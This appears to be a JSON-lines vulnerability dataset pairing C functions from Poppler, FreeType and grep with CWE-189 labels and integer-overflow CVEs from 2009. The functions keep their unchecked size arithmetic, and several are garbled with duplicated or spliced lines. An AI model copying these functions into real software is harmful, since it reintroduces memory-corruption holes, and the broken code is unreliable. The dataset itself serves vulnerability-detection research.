ctm[2] + ctm[4];\n  mat[5] = ctm[3] + ctm[5];\n\n  imgData.imgStr = new ImageStream(str, width,\n\t\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t\t   colorMap->getBits());\n  imgData.imgStr->reset();\n  imgData.colorMap = colorMap;\n  imgData.maskColors = maskColors;\n  imgData.colorMode = colorMode;\n  imgData.width = width;\n  imgData.height = height;\n  imgData.y = 0;\n\n  imgData.lookup = NULL;\n  if (colorMap->getNumPixelComps() == 1) {\n    n = 1 << colorMap->getBits();\n    switch (colorMode) {\n    case splashModeMono1:\n    case splashModeMono8:\n      imgData.lookup = (SplashColorPtr)gmalloc(n);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getGray(&pix, &gray);\n\timgData.lookup[i] = colToByte(gray);\n      }\n      break;\n    case splashModeRGB8:\n    case splashModeBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[3*i] = colToByte(rgb.r);\n\timgData.lookup[3*i+1] = colToByte(rgb.g);\n\timgData.lookup[3*i+2] = colToByte(rgb.b);\n       }\n       break;\n     case splashModeXBGR8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 3);\n       for (i = 0; i < n; ++i) {\n \tpix = (Guchar)i;\n \tcolorMap->getRGB(&pix, &rgb);\n\timgData.lookup[4*i] = colToByte(rgb.r);\n\timgData.lookup[4*i+1] = colToByte(rgb.g);\n\timgData.lookup[4*i+2] = colToByte(rgb.b);\n\timgData.lookup[4*i+3] = 255;\n      }\n      break;\n#if SPLASH_CMYK\n    case splashModeCMYK8:\n      imgData.lookup = (SplashColorPtr)gmallocn(n, 4);\n      for (i = 0; i < n; ++i) {\n\tpix = (Guchar)i;\n\tcolorMap->getCMYK(&pix, &cmyk);\n\timgData.lookup[4*i] = colToByte(cmyk.c);\n\timgData.lookup[4*i+1] = colToByte(cmyk.m);\n\timgData.lookup[4*i+2] = colToByte(cmyk.y);\n\timgData.lookup[4*i+3] = colToByte(cmyk.k);\n      }\n      break;\n#endif\n      break;\n    }\n  }\n\n  if (colorMode == splashModeMono1) {\n    srcMode = splashModeMono8;\n  } else {\n    srcMode = colorMode;\n  }\n  src = maskColors ? &alphaImageSrc : &imageSrc;\n  splash->drawImage(src, &imgData, srcMode, maskColors ? gTrue : gFalse,\n\t\t    width, height, mat);\n  if (inlineImg) {\n    while (imgData.y < height) {\n      imgData.imgStr->getLine();\n      ++imgData.y;\n    }\n  }\n\n  gfree(imgData.lookup);\n  delete imgData.imgStr;\n  str->close();\n}\n", "func_hash": 304076538021281751998637961089745244390, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 28, "project": "poppler", "commit_id": "7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "project_url": "https://github.com/freedesktop/poppler", "commit_url": "https://cgit.freedesktop.org/poppler/poppler/commit/?id=7b2d314a61fd0e12f47c62996cb49ec0d1ba747a", "commit_message": "Be paranoid, use gmallocn or gmallocn3 in all gmalloc with *", "target": 1, "func": "void ArthurOutputDev::drawImage(GfxState *state, Object *ref, Stream *str,\n\t\t\t\tint width, int height,\n\t\t\t\tGfxImageColorMap *colorMap,\n\t\t\t\tint *maskColors, GBool inlineImg)\n{\n  unsigned char *buffer;\n  unsigned int *dest;\n  int x, y;\n  ImageStream *imgStr;\n  Guchar *pix;\n  int i;\n  double *ctm;\n   QMatrix matrix;\n   int is_identity_transform;\n   \n  buffer = (unsigned char *)gmalloc (width * height * 4);\n \n   /* TODO: Do we want to cache these? */\n   imgStr = new ImageStream(str, width,\n\t\t\t   colorMap->getNumPixelComps(),\n\t\t\t   colorMap->getBits());\n  imgStr->reset();\n  \n  /* ICCBased color space doesn't do any color correction\n   * so check its underlying color space as well */\n  is_identity_transform = colorMap->getColorSpace()->getMode() == csDeviceRGB ||\n\t\t  (colorMap->getColorSpace()->getMode() == csICCBased && \n\t\t  ((GfxICCBasedColorSpace*)colorMap->getColorSpace())->getAlt()->getMode() == csDeviceRGB);\n\n  if (maskColors) {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n\n      for (x = 0; x < width; x++) {\n\tfor (i = 0; i < colorMap->getNumPixelComps(); ++i) {\n\t  \n\t  if (pix[i] < maskColors[2*i] * 255||\n\t      pix[i] > maskColors[2*i+1] * 255) {\n\t    *dest = *dest | 0xff000000;\n\t    break;\n\t  }\n\t}\n\tpix += colorMap->getNumPixelComps();\n\tdest++;\n      }\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_ARGB32);\n  }\n  else {\n    for (y = 0; y < height; y++) {\n      dest = (unsigned int *) (buffer + y * 4 * width);\n      pix = imgStr->getLine();\n      colorMap->getRGBLine (pix, dest, width);\n    }\n\n    m_image = new QImage(buffer, width, height, QImage::Format_RGB32);\n  }\n\n  if (m_image == NULL || m_image->isNull()) {\n    qDebug() << \"Null image\";\n    delete imgStr;\n    return;\n  }\n  ctm = state->getCTM();\n  matrix.setMatrix(ctm[0] / width, ctm[1] / width, -ctm[2] / height, -ctm[3] / height, ctm[2] + ctm[4], ctm[3] + ctm[5]);\n\n  m_painter->setMatrix(matrix, true);\n  m_painter->drawImage( QPoint(0,0), *m_image );\n  delete m_image;\n  m_image = 0;\n  free (buffer);\n  delete imgStr;\n\n}\n", "func_hash": 145223011821522984832787544024029108709, "file_name": "ArthurOutputDev.cc", "file_hash": 151245726146927238229836297588317481687, "cwe": ["CWE-189"], "cve": "CVE-2009-3605", "cve_desc": "Multiple integer overflows in Poppler 0.10.5 and earlier allow remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted PDF file, related to (1) glib/poppler-page.cc; (2) ArthurOutputDev.cc, (3) CairoOutputDev.cc, (4) GfxState.cc, (5) JBIG2Stream.cc, (6) PSOutputDev.cc, and (7) SplashOutputDev.cc in poppler/; and (8) SplashBitmap.cc, (9) Splash.cc, and (10) SplashFTFont.cc in splash/.  NOTE: this may overlap CVE-2009-0791.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-3605"}
{"idx": 121, "project": "savannah", "commit_id": "79972af4f0485a11dcb19551356c45245749fc5b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=79972af4f0485a11dcb19551356c45245749fc5b", "commit_message": "None", "target": 1, "func": "  ft_smooth_render_generic( FT_Renderer       render,\n                            FT_GlyphSlot      slot,\n                            FT_Render_Mode    mode,\n                            const FT_Vector*  origin,\n                            FT_Render_Mode    required_mode )\n  {\n    FT_Error     error;\n    FT_Outline*  outline = NULL;\n    FT_BBox      cbox;\n    FT_UInt      width, height, height_org, width_org, pitch;\n    FT_Bitmap*   bitmap;\n    FT_Memory    memory;\n    FT_Int       hmul = mode == FT_RENDER_MODE_LCD;\n    FT_Int       vmul = mode == FT_RENDER_MODE_LCD_V;\n    FT_Pos       x_shift, y_shift, x_left, y_top;\n\n    FT_Raster_Params  params;\n\n\n    /* check glyph image format */\n    if ( slot->format != render->glyph_format )\n    {\n      error = Smooth_Err_Invalid_Argument;\n      goto Exit;\n    }\n\n    /* check mode */\n    if ( mode != required_mode )\n      return Smooth_Err_Cannot_Render_Glyph;\n\n    outline = &slot->outline;\n\n    /* translate the outline to the new origin if needed */\n    if ( origin )\n      FT_Outline_Translate( outline, origin->x, origin->y );\n\n    /* compute the control box, and grid fit it */\n    FT_Outline_Get_CBox( outline, &cbox );\n\n    cbox.xMin = FT_PIX_FLOOR( cbox.xMin );\n    cbox.yMin = FT_PIX_FLOOR( cbox.yMin );\n    cbox.xMax = FT_PIX_CEIL( cbox.xMax );\n    cbox.yMax = FT_PIX_CEIL( cbox.yMax );\n\n    width  = (FT_UInt)( ( cbox.xMax - cbox.xMin ) >> 6 );\n    height = (FT_UInt)( ( cbox.yMax - cbox.yMin ) >> 6 );\n    bitmap = &slot->bitmap;\n    memory = render->root.memory;\n\n    width_org  = width;\n    height_org = height;\n\n    /* release old bitmap buffer */\n    if ( slot->internal->flags & FT_GLYPH_OWN_BITMAP )\n    {\n      FT_FREE( bitmap->buffer );\n       slot->internal->flags &= ~FT_GLYPH_OWN_BITMAP;\n     }\n \n    /* allocate new one, depends on pixel format */\n     pitch = width;\n     if ( hmul )\n     {\n      width = width * 3;\n      pitch = FT_PAD_CEIL( width, 4 );\n    }\n\n    if ( vmul )\n      height *= 3;\n\n    x_shift = (FT_Int) cbox.xMin;\n    y_shift = (FT_Int) cbox.yMin;\n    x_left  = (FT_Int)( cbox.xMin >> 6 );\n    y_top   = (FT_Int)( cbox.yMax >> 6 );\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    if ( slot->library->lcd_filter_func )\n    {\n      FT_Int  extra = slot->library->lcd_extra;\n\n\n      if ( hmul )\n      {\n        x_shift -= 64 * ( extra >> 1 );\n        width   += 3 * extra;\n        pitch    = FT_PAD_CEIL( width, 4 );\n        x_left  -= extra >> 1;\n      }\n\n      if ( vmul )\n      {\n        y_shift -= 64 * ( extra >> 1 );\n        height  += 3 * extra;\n        y_top   += extra >> 1;\n      }\n    }\n \n #endif\n \n     bitmap->pixel_mode = FT_PIXEL_MODE_GRAY;\n     bitmap->num_grays  = 256;\n     bitmap->width      = width;\n      goto Exit;\n\n    slot->internal->flags |= FT_GLYPH_OWN_BITMAP;\n\n    /* set up parameters */\n    params.target = bitmap;\n    params.source = outline;\n    params.flags  = FT_RASTER_FLAG_AA;\n\n#ifdef FT_CONFIG_OPTION_SUBPIXEL_RENDERING\n\n    /* implode outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x *= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y *= 3;\n    }\n\n    /* render outline into the bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* deflate outline if needed */\n    {\n      FT_Vector*  points     = outline->points;\n      FT_Vector*  points_end = points + outline->n_points;\n      FT_Vector*  vec;\n\n\n      if ( hmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->x /= 3;\n\n      if ( vmul )\n        for ( vec = points; vec < points_end; vec++ )\n          vec->y /= 3;\n    }\n\n    if ( slot->library->lcd_filter_func )\n      slot->library->lcd_filter_func( bitmap, mode, slot->library );\n\n#else /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    /* render outline into bitmap */\n    error = render->raster_render( render->raster, &params );\n\n    /* expand it horizontally */\n    if ( hmul )\n    {\n      FT_Byte*  line = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh--, line += pitch )\n      {\n        FT_UInt   xx;\n        FT_Byte*  end = line + width;\n\n\n        for ( xx = width_org; xx > 0; xx-- )\n        {\n          FT_UInt  pixel = line[xx-1];\n\n\n          end[-3] = (FT_Byte)pixel;\n          end[-2] = (FT_Byte)pixel;\n          end[-1] = (FT_Byte)pixel;\n          end    -= 3;\n        }\n      }\n    }\n\n    /* expand it vertically */\n    if ( vmul )\n    {\n      FT_Byte*  read  = bitmap->buffer + ( height - height_org ) * pitch;\n      FT_Byte*  write = bitmap->buffer;\n      FT_UInt   hh;\n\n\n      for ( hh = height_org; hh > 0; hh-- )\n      {\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n\n        ft_memcpy( write, read, pitch );\n        write += pitch;\n        read  += pitch;\n      }\n    }\n\n#endif /* !FT_CONFIG_OPTION_SUBPIXEL_RENDERING */\n\n    FT_Outline_Translate( outline, x_shift, y_shift );\n\n    if ( error )\n      goto Exit;\n\n    slot->format      = FT_GLYPH_FORMAT_BITMAP;\n    slot->bitmap_left = x_left;\n    slot->bitmap_top  = y_top;\n\n  Exit:\n    if ( outline && origin )\n      FT_Outline_Translate( outline, -origin->x, -origin->y );\n\n    return error;\n  }\n", "func_hash": 24717888926496377392853611670854702544, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 122, "project": "savannah", "commit_id": "0545ec1ca36b27cb928128870a83e5f668980bc5", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0545ec1ca36b27cb928128870a83e5f668980bc5", "commit_message": "None", "target": 1, "func": "  cff_charset_load( CFF_Charset  charset,\n                    FT_UInt      num_glyphs,\n                    FT_Stream    stream,\n                    FT_ULong     base_offset,\n                    FT_ULong     offset,\n                    FT_Bool      invert )\n  {\n    FT_Memory  memory = stream->memory;\n    FT_Error   error  = CFF_Err_Ok;\n    FT_UShort  glyph_sid;\n\n\n    /* If the the offset is greater than 2, we have to parse the */\n    /* charset table.                                            */\n    if ( offset > 2 )\n    {\n      FT_UInt  j;\n\n\n      charset->offset = base_offset + offset;\n\n      /* Get the format of the table. */\n      if ( FT_STREAM_SEEK( charset->offset ) ||\n           FT_READ_BYTE( charset->format )   )\n        goto Exit;\n\n      /* Allocate memory for sids. */\n      if ( FT_NEW_ARRAY( charset->sids, num_glyphs ) )\n        goto Exit;\n\n      /* assign the .notdef glyph */\n      charset->sids[0] = 0;\n\n      switch ( charset->format )\n      {\n      case 0:\n        if ( num_glyphs > 0 )\n        {\n          if ( FT_FRAME_ENTER( ( num_glyphs - 1 ) * 2 ) )\n             goto Exit;\n \n           for ( j = 1; j < num_glyphs; j++ )\n            charset->sids[j] = FT_GET_USHORT();\n \n           FT_FRAME_EXIT();\n         }\n            /* Read the first glyph sid of the range. */\n            if ( FT_READ_USHORT( glyph_sid ) )\n              goto Exit;\n\n            /* Read the number of glyphs in the range.  */\n            if ( charset->format == 2 )\n            {\n              if ( FT_READ_USHORT( nleft ) )\n                goto Exit;\n            }\n            else\n            {\n              if ( FT_READ_BYTE( nleft ) )\n                goto Exit;\n            }\n\n            /* Fill in the range of sids -- `nleft + 1' glyphs. */\n            for ( i = 0; j < num_glyphs && i <= nleft; i++, j++, glyph_sid++ )\n              charset->sids[j] = glyph_sid;\n          }\n        }\n        break;\n\n      default:\n        FT_ERROR(( \"cff_charset_load: invalid table format!\\n\" ));\n        error = CFF_Err_Invalid_File_Format;\n                 goto Exit;\n             }\n", "func_hash": 322437368215015751310197159603838280292, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2009-0946", "cve_desc": "Multiple integer overflows in FreeType 2.3.9 and earlier allow remote attackers to execute arbitrary code via vectors related to large values in certain inputs in (1) smooth/ftsmooth.c, (2) sfnt/ttcmap.c, and (3) cff/cffload.c.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2009-0946"}
{"idx": 167, "project": "savannah", "commit_id": "8fcf61523644df42e1905c81bed26838e0b04f91", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/grep.git/commit/?id=8fcf61523644df42e1905c81bed26838e0b04f91", "commit_message": "None", "target": 1, "func": "context_length_arg (char const *str, int *out)\n {\n  uintmax_t value;\n  if (! (xstrtoumax (str, 0, 10, &value, \"\") == LONGINT_OK\n         && 0 <= (*out = value)\n         && *out == value))\n     {\n       error (EXIT_TROUBLE, 0, \"%s: %s\", str,\n              _(\"invalid context length argument\"));\n     }\n   page size, unless a read yields a partial page.  */\n\nstatic char *buffer;\t\t/* Base of buffer. */\nstatic size_t bufalloc;\t\t/* Allocated buffer size, counting slop. */\n#define INITIAL_BUFSIZE 32768\t/* Initial buffer size, not counting slop. */\nstatic int bufdesc;\t\t/* File descriptor. */\nstatic char *bufbeg;\t\t/* Beginning of user-visible stuff. */\nstatic char *buflim;\t\t/* Limit of user-visible stuff. */\nstatic size_t pagesize;\t\t/* alignment of memory pages */\nstatic off_t bufoffset;\t\t/* Read offset; defined on regular files.  */\nstatic off_t after_last_match;\t/* Pointer after last matching line that\n                                   would have been output if we were\n                                   outputting characters. */\n\n/* Return VAL aligned to the next multiple of ALIGNMENT.  VAL can be\n   an integer or a pointer.  Both args must be free of side effects.  */\n#define ALIGN_TO(val, alignment) \\\n  ((size_t) (val) % (alignment) == 0 \\\n   ? (val) \\\n   : (val) + ((alignment) - (size_t) (val) % (alignment)))\n\n/* Reset the buffer for a new file, returning zero if we should skip it.\n   Initialize on the first time through. */\nstatic int\nreset (int fd, char const *file, struct stats *stats)\n{\n  if (! pagesize)\n    {\n      pagesize = getpagesize ();\n      if (pagesize == 0 || 2 * pagesize + 1 <= pagesize)\n        abort ();\n      bufalloc = ALIGN_TO (INITIAL_BUFSIZE, pagesize) + pagesize + 1;\n      buffer = xmalloc (bufalloc);\n    }\n\n  bufbeg = buflim = ALIGN_TO (buffer + 1, pagesize);\n  bufbeg[-1] = eolbyte;\n  bufdesc = fd;\n\n  if (S_ISREG (stats->stat.st_mode))\n    {\n      if (file)\n        bufoffset = 0;\n      else\n        {\n          bufoffset = lseek (fd, 0, SEEK_CUR);\n          if (bufoffset < 0)\n            {\n              suppressible_error (_(\"lseek failed\"), errno);\n              return 0;\n            }\n        }\n    }\n  return 1;\n}\n\n/* Read new stuff into the buffer, saving the specified\n   amount of old stuff.  When we're done, 'bufbeg' points\n   to the beginning of the buffer contents, and 'buflim'\n   points just after the end.  Return zero if there's an error.  */\nstatic int\nfillbuf (size_t save, struct stats const *stats)\n{\n  size_t fillsize = 0;\n  int cc = 1;\n  char *readbuf;\n  size_t readsize;\n\n  /* Offset from start of buffer to start of old stuff\n     that we want to save.  */\n  size_t saved_offset = buflim - save - buffer;\n\n  if (pagesize <= buffer + bufalloc - buflim)\n    {\n      readbuf = buflim;\n      bufbeg = buflim - save;\n    }\n  else\n    {\n      size_t minsize = save + pagesize;\n      size_t newsize;\n      size_t newalloc;\n      char *newbuf;\n\n      /* Grow newsize until it is at least as great as minsize.  */\n      for (newsize = bufalloc - pagesize - 1; newsize < minsize; newsize *= 2)\n        if (newsize * 2 < newsize || newsize * 2 + pagesize + 1 < newsize * 2)\n          xalloc_die ();\n\n      /* Try not to allocate more memory than the file size indicates,\n         as that might cause unnecessary memory exhaustion if the file\n         is large.  However, do not use the original file size as a\n         heuristic if we've already read past the file end, as most\n         likely the file is growing.  */\n      if (S_ISREG (stats->stat.st_mode))\n        {\n          off_t to_be_read = stats->stat.st_size - bufoffset;\n          off_t maxsize_off = save + to_be_read;\n          if (0 <= to_be_read && to_be_read <= maxsize_off\n              && maxsize_off == (size_t) maxsize_off\n              && minsize <= (size_t) maxsize_off\n              && (size_t) maxsize_off < newsize)\n            newsize = maxsize_off;\n        }\n\n      /* Add enough room so that the buffer is aligned and has room\n         for byte sentinels fore and aft.  */\n      newalloc = newsize + pagesize + 1;\n\n      newbuf = bufalloc < newalloc ? xmalloc (bufalloc = newalloc) : buffer;\n      readbuf = ALIGN_TO (newbuf + 1 + save, pagesize);\n      bufbeg = readbuf - save;\n      memmove (bufbeg, buffer + saved_offset, save);\n      bufbeg[-1] = eolbyte;\n      if (newbuf != buffer)\n        {\n          free (buffer);\n          buffer = newbuf;\n        }\n    }\n\n  readsize = buffer + bufalloc - readbuf;\n  readsize -= readsize % pagesize;\n\n  if (! fillsize)\n    {\n      ssize_t bytesread;\n      while ((bytesread = read (bufdesc, readbuf, readsize)) < 0\n             && errno == EINTR)\n        continue;\n      if (bytesread < 0)\n        cc = 0;\n      else\n        fillsize = bytesread;\n    }\n\n  bufoffset += fillsize;\n#if defined HAVE_DOS_FILE_CONTENTS\n  if (fillsize)\n    fillsize = undossify_input (readbuf, fillsize);\n#endif\n  buflim = readbuf + fillsize;\n  return cc;\n}\n\n/* Flags controlling the style of output. */\nstatic enum\n{\n  BINARY_BINARY_FILES,\n  TEXT_BINARY_FILES,\n  WITHOUT_MATCH_BINARY_FILES\n} binary_files;\t\t/* How to handle binary files.  */\n\nstatic int filename_mask;\t/* If zero, output nulls after filenames.  */\nstatic int out_quiet;\t\t/* Suppress all normal output. */\nstatic int out_invert;\t\t/* Print nonmatching stuff. */\nstatic int out_file;\t\t/* Print filenames. */\nstatic int out_line;\t\t/* Print line numbers. */\nstatic int out_byte;\t\t/* Print byte offsets. */\nstatic int out_before;\t\t/* Lines of leading context. */\nstatic int out_after;\t\t/* Lines of trailing context. */\n static int out_file;\t\t/* Print filenames. */\n static int out_line;\t\t/* Print line numbers. */\n static int out_byte;\t\t/* Print byte offsets. */\nstatic int out_before;\t\t/* Lines of leading context. */\nstatic int out_after;\t\t/* Lines of trailing context. */\n static int count_matches;\t/* Count matching lines.  */\n static int list_files;\t\t/* List matching files.  */\n static int no_filenames;\t/* Suppress file names.  */\nstatic off_t max_count;\t\t/* Stop after outputting this many\n                                    lines from an input file.  */\n static int line_buffered;       /* If nonzero, use line buffering, i.e.\n                                    fflush everyline out.  */\nstatic char const *lastnl;\t/* Pointer after last newline counted. */\nstatic char const *lastout;\t/* Pointer after last character output;\n                                   NULL if no character has been output\n                                   or if it's conceptually before bufbeg. */\nstatic uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic off_t outleft;\t\t/* Maximum number of lines to be output.  */\nstatic int pending;\t\t/* Pending lines of output.\n                                    NULL if no character has been output\n                                    or if it's conceptually before bufbeg. */\n static uintmax_t totalnl;\t/* Total newline count before lastnl. */\nstatic off_t outleft;\t\t/* Maximum number of lines to be output.  */\nstatic int pending;\t\t/* Pending lines of output.\n                                    Always kept 0 if out_quiet is true.  */\n static int done_on_match;\t/* Stop scanning file on first match.  */\n static int exit_on_match;\t/* Exit on first match.  */\n/* Add two numbers that count input bytes or lines, and report an\n   error if the addition overflows.  */\nstatic uintmax_t\nadd_count (uintmax_t a, uintmax_t b)\n{\n  uintmax_t sum = a + b;\n  if (sum < a)\n    error (EXIT_TROUBLE, 0, _(\"input is too large to count\"));\n  return sum;\n}\n\nstatic void\nnlscan (char const *lim)\n{\n  size_t newlines = 0;\n  char const *beg;\n  for (beg = lastnl; beg < lim; beg++)\n    {\n      beg = memchr (beg, eolbyte, lim - beg);\n      if (!beg)\n        break;\n      newlines++;\n    }\n  totalnl = add_count (totalnl, newlines);\n  lastnl = lim;\n}\n\n/* Print the current filename.  */\nstatic void\nprint_filename (void)\n{\n  pr_sgr_start_if (filename_color);\n  fputs (filename, stdout);\n  pr_sgr_end_if (filename_color);\n}\n\n/* Print a character separator.  */\nstatic void\nprint_sep (char sep)\n{\n  pr_sgr_start_if (sep_color);\n  fputc (sep, stdout);\n  pr_sgr_end_if (sep_color);\n}\n\n/* Print a line number or a byte offset.  */\nstatic void\nprint_offset (uintmax_t pos, int min_width, const char *color)\n{\n  /* Do not rely on printf to print pos, since uintmax_t may be longer\n     than long, and long long is not portable.  */\n\n  char buf[sizeof pos * CHAR_BIT];\n  char *p = buf + sizeof buf;\n\n  do\n    {\n      *--p = '0' + pos % 10;\n      --min_width;\n    }\n  while ((pos /= 10) != 0);\n\n  /* Do this to maximize the probability of alignment across lines.  */\n  if (align_tabs)\n    while (--min_width >= 0)\n      *--p = ' ';\n\n  pr_sgr_start_if (color);\n  fwrite (p, 1, buf + sizeof buf - p, stdout);\n  pr_sgr_end_if (color);\n}\n\n/* Print a whole line head (filename, line, byte).  */\nstatic void\nprint_line_head (char const *beg, char const *lim, int sep)\n{\n  int pending_sep = 0;\n\n  if (out_file)\n    {\n      print_filename ();\n      if (filename_mask)\n        pending_sep = 1;\n      else\n        fputc (0, stdout);\n    }\n\n  if (out_line)\n    {\n      if (lastnl < lim)\n        {\n          nlscan (beg);\n          totalnl = add_count (totalnl, 1);\n          lastnl = lim;\n        }\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (totalnl, 4, line_num_color);\n      pending_sep = 1;\n    }\n\n  if (out_byte)\n    {\n      uintmax_t pos = add_count (totalcc, beg - bufbeg);\n#if defined HAVE_DOS_FILE_CONTENTS\n      pos = dossified_pos (pos);\n#endif\n      if (pending_sep)\n        print_sep (sep);\n      print_offset (pos, 6, byte_num_color);\n      pending_sep = 1;\n    }\n\n  if (pending_sep)\n    {\n      /* This assumes sep is one column wide.\n         Try doing this any other way with Unicode\n         (and its combining and wide characters)\n         filenames and you're wasting your efforts.  */\n      if (align_tabs)\n        fputs (\"\\t\\b\", stdout);\n\n      print_sep (sep);\n    }\n}\n\nstatic const char *\nprint_line_middle (const char *beg, const char *lim,\n                   const char *line_color, const char *match_color)\n{\n  size_t match_size;\n  size_t match_offset;\n  const char *cur = beg;\n  const char *mid = NULL;\n\n  while (cur < lim\n         && ((match_offset = execute (beg, lim - beg, &match_size,\n                                      beg + (cur - beg))) != (size_t) -1))\n    {\n      char const *b = beg + match_offset;\n\n      /* Avoid matching the empty line at the end of the buffer. */\n      if (b == lim)\n        break;\n\n      /* Avoid hanging on grep --color \"\" foo */\n      if (match_size == 0)\n        {\n          /* Make minimal progress; there may be further non-empty matches.  */\n          /* XXX - Could really advance by one whole multi-octet character.  */\n          match_size = 1;\n          if (!mid)\n            mid = cur;\n        }\n      else\n        {\n          /* This function is called on a matching line only,\n             but is it selected or rejected/context?  */\n          if (only_matching)\n            print_line_head (b, lim, (out_invert ? SEP_CHAR_REJECTED\n                                      : SEP_CHAR_SELECTED));\n          else\n            {\n              pr_sgr_start (line_color);\n              if (mid)\n                {\n                  cur = mid;\n                  mid = NULL;\n                }\n              fwrite (cur, sizeof (char), b - cur, stdout);\n            }\n\n          pr_sgr_start_if (match_color);\n          fwrite (b, sizeof (char), match_size, stdout);\n          pr_sgr_end_if (match_color);\n          if (only_matching)\n            fputs (\"\\n\", stdout);\n        }\n      cur = b + match_size;\n    }\n\n  if (only_matching)\n    cur = lim;\n  else if (mid)\n    cur = mid;\n\n  return cur;\n}\n\nstatic const char *\nprint_line_tail (const char *beg, const char *lim, const char *line_color)\n{\n  size_t eol_size;\n  size_t tail_size;\n\n  eol_size   = (lim > beg && lim[-1] == eolbyte);\n  eol_size  += (lim - eol_size > beg && lim[-(1 + eol_size)] == '\\r');\n  tail_size  =  lim - eol_size - beg;\n\n  if (tail_size > 0)\n    {\n      pr_sgr_start (line_color);\n      fwrite (beg, 1, tail_size, stdout);\n      beg += tail_size;\n      pr_sgr_end (line_color);\n    }\n\n  return beg;\n}\n\nstatic void\nprline (char const *beg, char const *lim, int sep)\n{\n  int matching;\n  const char *line_color;\n  const char *match_color;\n\n  if (!only_matching)\n    print_line_head (beg, lim, sep);\n\n  matching = (sep == SEP_CHAR_SELECTED) ^ !!out_invert;\n\n  if (color_option)\n    {\n      line_color = (((sep == SEP_CHAR_SELECTED)\n                     ^ (out_invert && (color_option < 0)))\n                    ? selected_line_color  : context_line_color);\n      match_color = (sep == SEP_CHAR_SELECTED\n                     ? selected_match_color : context_match_color);\n    }\n  else\n    line_color = match_color = NULL; /* Shouldn't be used.  */\n\n  if ((only_matching && matching)\n      || (color_option  && (*line_color || *match_color)))\n    {\n      /* We already know that non-matching lines have no match (to colorize).  */\n      if (matching && (only_matching || *match_color))\n        beg = print_line_middle (beg, lim, line_color, match_color);\n\n      /* FIXME: this test may be removable.  */\n      if (!only_matching && *line_color)\n        beg = print_line_tail (beg, lim, line_color);\n    }\n\n  if (!only_matching && lim > beg)\n    fwrite (beg, 1, lim - beg, stdout);\n\n  if (ferror (stdout))\n    {\n      write_error_seen = 1;\n      error (EXIT_TROUBLE, 0, _(\"write error\"));\n    }\n\n  lastout = lim;\n\n  if (line_buffered)\n    fflush (stdout);\n}\n\n/* Print pending lines of trailing context prior to LIM. Trailing context ends\n   at the next matching line when OUTLEFT is 0.  */\nstatic void\nprpending (char const *lim)\n{\n  if (!lastout)\n    lastout = bufbeg;\n  while (pending > 0 && lastout < lim)\n    {\n      char const *nl = memchr (lastout, eolbyte, lim - lastout);\n      size_t match_size;\n      --pending;\n      if (outleft\n          || ((execute (lastout, nl + 1 - lastout,\n                        &match_size, NULL) == (size_t) -1)\n              == !out_invert))\n        prline (lastout, nl + 1, SEP_CHAR_REJECTED);\n      else\n        pending = 0;\n    }\n}\n\n/* Print the lines between BEG and LIM.  Deal with context crap.\n   If NLINESP is non-null, store a count of lines between BEG and LIM.  */\nstatic void\nprtext (char const *beg, char const *lim, int *nlinesp)\n{\n /* Print the lines between BEG and LIM.  Deal with context crap.\n    If NLINESP is non-null, store a count of lines between BEG and LIM.  */\n static void\nprtext (char const *beg, char const *lim, int *nlinesp)\n {\n   static int used;\t/* avoid printing SEP_STR_GROUP before any output */\n   char const *bp, *p;\n   char eol = eolbyte;\n  int i, n;\n \n   if (!out_quiet && pending > 0)\n     prpending (beg);\n      /* 